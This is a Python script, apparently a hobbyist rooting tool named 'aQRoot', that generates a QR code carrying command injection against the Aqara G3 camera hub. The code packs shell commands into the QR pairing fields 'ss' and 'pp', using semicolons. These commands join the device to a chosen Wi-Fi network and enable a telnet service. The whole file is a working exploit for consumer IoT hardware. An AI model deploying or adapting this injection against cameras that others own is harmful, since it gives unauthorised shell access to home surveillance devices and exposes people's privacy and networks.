#!/usr/bin/env python3
import argparse
import segno

__title__ = "aQRoot"
__desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
__version__ = "0.4"
__author__ = "Gareth Bryan"
__license__ = "MIT"


def generate_payload(model, payload):
    """
    qrcode buffer is [1024]
    "fw_factory.sh <ss> <pp>"
    """
    arg_max_len = 123
    payload_max_len = 1023

    append = lambda s, c: (s or ";") + ("" if (s or ";") == ";" else ";") + c

    ss, pp = ";", ""
    for cmd in payload:
        if len(s_try := append(ss, cmd)) <= arg_max_len:
            ss = s_try
        elif len(p_try := append(pp, cmd)) <= arg_max_len:
            pp = p_try
        else:
            raise ValueError(f"command won't fit in either field (limit {arg_max_len}): {cmd!r}")

    qrcode_data = {
        "vv": "1",
        "mm": f"lumi.camera.{model}",
        "ss": ss,
        "pp": pp,
    }
    payload_string = "&".join([f"{k}={v}" for k, v in qrcode_data.items()])
    #print(payload_string)
    if len(payload_string) > payload_max_len:
        raise ValueError(f"payload exceeds {len(payload_string)}/{payload_max_len}")
    return payload_string


def gen_qrcode(data, outfile=None):
    qrcode = segno.make(data, error="h")
    qrcode.terminal(compact=True, border=5)
    if outfile:
        qrcode.save(outfile, border=5, scale=8)


def main(args):
    try:
        data = generate_payload(
            model=args.model,
            payload= [
                f"/usr/factory_test/bin/wifi_test_station.sh '{args.ssid}' '{args.pwd}' {args.algo}",
                "echo 1 > /sys/class/gpio/gpio49/value",
                "fw_manager.sh -t -k",
            ]
        )
        gen_qrcode(data, args.filename)
    except ValueError as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="{} v{}\n{}".format(__title__, __version__, __desc__),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "model",
        help="Camera model",
        choices=["gwpgl1","gwpagl01"]
    )

    parser.add_argument(
        "ssid",
        help="Wireless SSID",
    )
    parser.add_argument(
        "pwd",
        help="Wireless Password"
    )

    parser.add_argument(
        "algo",
        help="Wireless Algo (e.g wpa2)"
    )

    parser.add_argument(
        "filename",
        nargs="?",
        type=argparse.FileType("wb"),
        help="(Optional) Save QR Code as image",
    )
    args = parser.parse_args()
    main(args)
